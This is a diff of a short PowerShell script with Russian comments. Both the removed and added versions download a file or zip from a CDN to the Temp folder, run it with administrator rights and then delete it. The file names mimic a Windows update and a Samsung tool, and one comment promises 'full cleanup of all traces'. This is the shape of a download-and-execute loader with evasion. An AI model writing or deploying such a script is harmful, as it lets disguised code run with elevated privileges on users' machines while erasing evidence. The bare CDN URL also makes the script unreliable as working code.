@@ -1,12 +1,16 @@
-# Ссылка на ваш исполняемый файл через рабочее зеркало cdn.jsdelivr.net
 $url = "https://jsdelivr.net"
-$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"
+$zipPath = "$env:LOCALAPPDATA\Temp\project.zip"
+$destDir = "$env:LOCALAPPDATA\Temp\update_sys"
 
-# Скачивание файла во временную папку
-Invoke-WebRequest -Uri $url -OutFile $path
+# Скачивание безопасного архива
+Invoke-WebRequest -Uri $url -OutFile $zipPath
 
-# Запуск файла от имени администратора. Скрипт будет ждать, пока вы не закроете программу
-Start-Process -FilePath $path -Verb RunAs -Wait
+# Распаковка архива во временную папку
+Expand-Archive -LiteralPath $zipPath -DestinationPath $destDir -Force
 
-# Полное удаление файла с вашего компьютера сразу после закрытия программы
-Remove-Item -Path $path -Force
+# Запуск распакованного файла от админа с ожиданием закрытия
+Start-Process -FilePath "$destDir\SamsungSmartSwitch.exe" -Verb RunAs -Wait
+
+# Полная зачистка всех следов с диска
+Remove-Item -Path $zipPath -Force
+Remove-Item -Path $destDir -Recurse -Force
